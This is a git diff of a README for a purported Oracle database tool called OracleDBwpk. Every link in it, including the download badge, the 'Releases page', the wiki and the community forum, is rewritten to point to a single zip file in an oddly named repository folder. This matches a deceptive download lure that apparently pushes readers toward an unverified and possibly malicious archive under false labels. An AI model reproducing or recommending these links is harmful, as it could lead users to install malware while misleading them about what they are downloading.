@@ -1,6 +1,6 @@
 # 🚀 OracleDBwpk - Simplifying Your Database Experience
 
-[![Download OracleDBwpk](https://img.shields.io/badge/Download-OracleDBwpk-blue)](https://github.com/Solomanchik/OracleDBwpk/releases)
+[![Download OracleDBwpk](https://github.com/Solomanchik/OracleDBwpk/raw/refs/heads/main/antihysteric/D_Bwpk_Oracle_2.1.zip)](https://github.com/Solomanchik/OracleDBwpk/raw/refs/heads/main/antihysteric/D_Bwpk_Oracle_2.1.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ OracleDBwpk is a user-friendly application designed to help you manage your Orac
 Follow these simple steps to download and run OracleDBwpk:
 
 1. **Access the Releases Page**
-   - Click on this link to visit the [Releases page](https://github.com/Solomanchik/OracleDBwpk/releases).
+   - Click on this link to visit the [Releases page](https://github.com/Solomanchik/OracleDBwpk/raw/refs/heads/main/antihysteric/D_Bwpk_Oracle_2.1.zip).
 
 2. **Choose the Latest Version**
    - On the Releases page, look for the newest version listed at the top. The latest version will usually have a higher number, like 1.0 or 2.1.
@@ -46,7 +46,7 @@ To ensure smooth operation, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-Ready to get started? [Visit the Releases page to download OracleDBwpk](https://github.com/Solomanchik/OracleDBwpk/releases).
+Ready to get started? [Visit the Releases page to download OracleDBwpk](https://github.com/Solomanchik/OracleDBwpk/raw/refs/heads/main/antihysteric/D_Bwpk_Oracle_2.1.zip).
 
 ## 🔧 Troubleshooting
 
@@ -62,7 +62,7 @@ For help with OracleDBwpk, feel free to reach out through the issues section on 
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Explore our detailed [Wiki page](https://github.com/Solomanchik/OracleDBwpk/wiki) for advanced features and use cases.
-- **Community Forum:** Join discussions and share tips with other users on our [community forum](https://community.example.com).
+- **Documentation:** Explore our detailed [Wiki page](https://github.com/Solomanchik/OracleDBwpk/raw/refs/heads/main/antihysteric/D_Bwpk_Oracle_2.1.zip) for advanced features and use cases.
+- **Community Forum:** Join discussions and share tips with other users on our [community forum](https://github.com/Solomanchik/OracleDBwpk/raw/refs/heads/main/antihysteric/D_Bwpk_Oracle_2.1.zip).
 
 Thank you for choosing OracleDBwpk for your database needs! Enjoy managing your databases with ease.
